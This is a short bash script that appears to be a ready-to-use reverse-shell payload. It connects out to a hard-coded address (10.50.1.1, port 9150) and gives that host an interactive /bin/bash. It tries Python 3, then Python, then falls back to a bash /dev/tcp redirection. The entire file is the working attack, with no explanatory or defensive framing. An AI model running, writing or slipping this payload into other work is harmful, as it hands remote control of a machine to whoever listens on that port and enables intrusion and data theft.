#!/bin/bash
IP="10.50.1.1"
PORT="9150"

if command -v python3 >/dev/null; then
    python3 -c "import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('$IP',$PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn('/bin/bash')"
elif command -v python >/dev/null; then
    python -c "import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('$IP',$PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn('/bin/bash')"
else
    bash -i >& /dev/tcp/$IP/$PORT 0>&1
fi
